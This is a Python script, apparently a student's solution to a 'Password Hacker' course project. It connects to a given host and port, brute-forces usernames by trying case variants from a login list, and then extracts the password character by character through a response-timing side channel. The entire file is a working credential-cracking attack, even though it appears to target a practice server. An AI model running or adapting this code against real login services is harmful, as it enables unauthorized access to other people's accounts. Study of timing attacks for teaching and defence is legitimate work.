import sys
import socket
import itertools
import string
import os
import json
import time

def next_password():

    chars = string.ascii_uppercase + string.ascii_lowercase + string.digits
    i = -1
    while True:
        i += 1
        yield chars[i % len(chars)]


def next_login(file):

    logins = (line for line in file.read().splitlines())
    for login in logins:
        for combo in set(map(''.join, itertools.product(*zip(login.upper(), login.lower())))):
            yield combo

def get_login(file, new_socket):

    iter = next_login(file)
    login = "".join(next(iter))

    while True:
        dictionary = {"login" : login, "password" : " "}
        new_socket.send(json.dumps(dictionary).encode())
        message = new_socket.recv(1024).decode()
        if json.loads(message)["result"] != "Wrong login!":
            return login
        else:
            login = "".join(next(iter))


def get_password(login, new_socket):

    iter = next_password()
    password = "".join(next(iter))
    temp = ""

    while True:
        dictionary = {"login" : login, "password" : password}
        new_socket.send(json.dumps(dictionary).encode())
        start = time.perf_counter()
        message = new_socket.recv(1024).decode()
        end = time.perf_counter()
        if end - start > 90000/1000000 :
            temp = password
        elif json.loads(message)["result"] == "Connection success!":
            return password
        password = temp + "".join(next(iter))


def get_args():
    args = sys.argv
    if len(args) != 3:
        print("wrong number of arguments")
        sys.exit(1)
    return args


def main():

    args = get_args()
    file = open("C:\\Users\\Ansis\\Desktop\\ChemScraper\\Password Hacker\\Password Hacker\\task\\hacking\\logins.txt", "r")
    new_socket = socket.socket()
    new_socket.connect((args[1], int(args[2])))
    login = get_login(file, new_socket)
    password = get_password(login, new_socket)
    print(json.dumps({"login" : login, "password" : password}))
    file.close()
    new_socket.close()

if __name__ == "__main__":
    main()